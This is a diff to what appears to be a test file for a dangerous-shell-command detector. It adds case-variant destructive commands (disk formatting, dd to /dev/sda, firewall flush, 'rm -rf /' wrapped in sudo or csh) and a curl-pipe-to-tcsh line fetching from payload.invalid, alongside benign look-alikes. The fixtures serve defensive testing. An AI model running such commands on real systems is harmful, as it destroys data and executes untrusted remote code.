@@ -75,6 +75,17 @@ MUST_FLAG_DANGER = [
     "git clean -xdf",
     "git clean -fdx",
     "git reset --hard",
+    # On case-insensitive filesystems these uppercase executable spellings
+    # resolve and run. Whole-command rules must case-fold the executable only,
+    # while keeping case-sensitive flags and subcommands exact.
+    "MKFS.EXT4 /dev/sda1",
+    "DD if=/dev/zero of=/dev/sda",
+    "CRYPTSETUP luksFormat /dev/sda1",
+    "PARTED /dev/sda rm 1",
+    "SHUTDOWN -h now",
+    "GIT reset --hard",
+    "USERDEL -r bob",
+    "IPTABLES -F",
     "mv /usr /tmp",
     r":(){ :|:& };:",                     # fork bomb, real-world spacing
     r":() { :|: & }; :",
@@ -94,6 +105,9 @@ MUST_FLAG_DANGER = [
     "TIMEOUT 5 bash -c 'rm -rf /'",
     "csh -c 'rm -rf /'",                  # csh/tcsh ship with macOS and execute -c strings
     "/bin/tcsh -c 'rm -rf /'",
+    "SUDO -u root /BIN/BASH -c 'rm -rf /'",
+    "TIMEOUT --signal KILL 5 CSH -fc 'rm -rf /'",
+    "/USR/BIN/CURL https://payload.invalid/x | /BIN/TCSH",
     "bash -c 'echo ready; rm -rf /'",    # separators inside the -c string are not top-level
     "bash -lc 'rm -rf /'",               # -c can be bundled with other shell flags
     "sh -xc 'rm -rf /'",
@@ -293,6 +307,12 @@ MUST_BE_CLEAN_OF_DANGER = [
     "/bin/BASH -c 'echo hi'",
     "/usr/bin/SUDO systemctl restart nginx",
     "csh -c 'echo hi'",
+    "tcsh -b -c 'rm -rf /'",             # -b consumes -c as its script filename
+    "tcsh -n -c 'rm -rf /'",             # -n does the same in no-execute mode
+    "GIT log --oneline -10",
+    "IPTABLES -L -n",
+    "/BIN/RM -rf ./build",
+    "DD if=/dev/zero of=./scratch.img bs=1M count=10",
     "printf 'echo hi\n' | tcsh",
     "shred -u ./secret.txt",
     "cd ./build && rm -rf *",
